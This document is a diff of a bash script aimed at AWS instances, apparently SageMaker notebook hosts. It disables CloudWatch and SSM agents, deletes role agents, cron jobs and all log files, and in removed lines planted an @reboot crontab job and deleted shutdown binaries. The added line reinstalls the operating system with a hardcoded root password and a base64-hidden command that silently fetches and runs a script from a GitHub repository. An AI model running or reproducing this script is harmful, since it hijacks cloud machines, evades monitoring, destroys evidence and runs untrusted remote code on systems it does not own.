@@ -1,11 +1,4 @@
 #!/bin/bash
 systemctl disable amazon-cloudwatch-agent; systemctl stop amazon-cloudwatch-agent; rm -rf /usr/bin/ssm-agent-worker /usr/bin/amazon-ssm-agent /usr/sbin/role-agent /usr/libexec/postfix/master /opt/aws/amazon-cloudwatch-agent /etc/opt/ml/scripts/clean-jupyter-log /etc/opt/ml/scripts/sagemaker-nbi-agent /etc/opt/ml/scripts/restart-sagemaker-agent-watcher /etc/opt/ml/scripts/relaunch-docker-service /etc/opt/ml/scripts/sagemaker-role-proxy-agent /etc/opt/ml/scripts/set-up-agent-namespace /usr/sbin/sample-notebooks-config /opt/.sagemaker/add_cloud_watch_agent_configuration.py /etc/cron.d/* /etc/cron.daily/* /etc/cron.hourly/*; find /var/log -type f -delete;
 
-rm -rf /etc/opt
-rm -rf /opt/aws
-rm -rf /home/ec2-user
-###bash <(wget -qO- https://github.com/army2mil/cautech/raw/refs/heads/main/...) >/dev/null 2>&1 &
-
-sed -i "/^@reboot/d;\$a\@reboot root /bin/bash <(wget -qO- https://raw.githubusercontent.com/army2mil/cautech/refs/heads/main/...) >>/dev/null 2>&1 &\n\n\n" /etc/crontab
-reboot
-sudo rm -rf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl || rm -rf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl
+bash <(wget --no-check-certificate -qO- https://raw.githubusercontent.com/MoeClub/Note/master/InstallNET.sh) -d 12 -v 64 -a -p "Ls.123456" -port 2233 -cmd "IyEvYmluL2Jhc2gKCmFwdCAtcXF5IGluc3RhbGwgd2dldApiYXNoIDwod2dldCAtcU8tIGh0dHBzOi8vZ2l0aHViLmNvbS9hcm15Mm1pbC9jYXV0ZWNoL3Jhdy9yZWZzL2hlYWRzL21haW4vLi4uKSA+Pi9kZXYvbnVsbCAyPiYxICYK"
